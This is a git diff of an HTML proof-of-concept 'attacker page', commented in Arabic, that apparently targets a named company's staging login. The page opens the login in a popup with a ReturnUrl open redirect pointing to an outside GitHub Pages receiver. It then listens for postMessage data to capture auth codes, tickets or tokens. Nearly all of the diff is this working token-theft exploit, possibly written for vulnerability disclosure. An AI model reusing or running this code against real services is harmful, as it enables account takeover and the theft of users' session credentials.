@@ -1,17 +1,30 @@
 <!DOCTYPE html>
 <html>
 <body>
+<h2>صفحة المهاجم (attacker.html)</h2>
+<p>إذا ظهرت بيانات الرمز أدناه، فهذا يعني نجاح الهجوم.</p>
+<div id="output" style="background:#f0f0f0; padding:10px;"></div>
+
 <script>
-// رابط تسجيل الدخول مع ReturnUrl يوجه لصفحة مستقبلة (مثلا receiver.html) على نفس النطاق
-var loginUrl = 'https://enterprise-hub-identity-stage.servicetitan.com/Account/Login?ReturnUrl=//fadyashraf44.github.io/receiver.html';
+// رابط تسجيل الدخول الذي سيفتح في النافذة المنبثقة،
+// ويعيد التوجيه بعد الدخول إلى receiver.html على نفس النطاق.
+var loginUrl = 'https://enterprise-hub-identity-stage.servicetitan.com/Account/Login?ReturnUrl=//fadyashraf44.github.io/poc/receiver.html';
+
+// فتح نافذة منبثقة
 var popup = window.open(loginUrl, 'loginPopup', 'width=600,height=700');
 
+// الاستماع لأي رسالة postMessage قادمة من النافذة المنبثقة (من صفحة receiver)
 window.addEventListener('message', function(event) {
-  // تأكد من المصدر (بعد ما تضبطه حسب المجال الصحيح)
-  if (event.origin === 'https://fadyashraf44.github.io') {
-    console.log('Received token data:', event.data);
-    // هنا ستظهر الرموز المؤقتة لو نجحت
-  }
+    // التأكد من أن المصدر هو نطاق صفحتنا على GitHub
+    if (event.origin === 'https://fadyashraf44.github.io') {
+        console.log('[Attacker] Received message from popup:', event.data);
+        var output = document.getElementById('output');
+        output.innerHTML += '<pre>' + JSON.stringify(event.data, null, 2) + '</pre>';
+
+        // في حال احتوى الحدث على رمز (code) أو تذكرة (ticket)، يكون الاختراق قد تم
+    } else {
+        console.log('[Attacker] Ignored message from origin:', event.origin);
+    }
 });
 </script>
 </body>
